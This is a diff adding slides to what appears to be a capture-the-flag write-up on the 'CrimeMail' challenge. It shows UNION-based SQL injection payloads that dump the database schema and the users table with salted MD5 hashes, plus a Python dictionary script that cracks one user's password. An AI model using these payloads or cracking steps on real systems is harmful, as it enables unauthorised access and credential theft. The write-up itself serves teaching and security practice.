@@ -1838,7 +1838,74 @@ version for the right syntax to use near ''''' at line 1
 
 This is a strong indication that the user input is **not sanitized correctly** and is vulnerable to SQL injection!
 
+We use a UNION-based injection in `/forgot.php` to dump the `INFORMATION_SCHEMA`:
+
+<br/>
+
+
+```
+' UNION SELECT CONCAT(TABLE_NAME,":",COLUMN_NAME)
+  FROM INFORMATION_SCHEMA.COLUMNS #
+```
+
+This reveals the structure of the database, including a `users` table with columns: `userid`, `username`, `pass_salt`, `pass_md5`.
+
 </div>
+
+
+
+</div>
+
+---
+
+## CrimeMail - Exploitation (Step 2: Dump Users)
+
+<div class="content-center">
+
+Now we dump the `users` table:
+
+<br/>
+
+
+```
+'  UNION SELECT CONCAT(userid,":",username,":",pass_salt,":",pass_md5)
+  FROM users #
+```
+
+This reveals the usernames, salts, and MD5 password hashes for all users.
+
+
+
+</div>
+
+---
+
+## CrimeMail - Exploitation (Step 3: Crack the Password)
+
+<div class="content-center">
+
+We perform a bruteforce with a simple Python script using a dictionary (`rockyou.txt`):
+
+<br/>
+
+
+```python
+#!/usr/bin/python
+import hashlib
+
+for passwd in open("rockyou.txt", "r"):
+    if hashlib.md5(
+        (passwd.strip() + "yhbG").encode()
+    ).hexdigest() == "f2b31b3a7a7c41093321d0c98c37f5ad":
+        print("[+] password for Collins Hackle is {}".format(
+            passwd.strip()
+        ))
+        exit(0)
+
+print("[+] Done")
+```
+
+The password is found in the dictionary, and we can now log in as Collins Hackle!
 
 
 
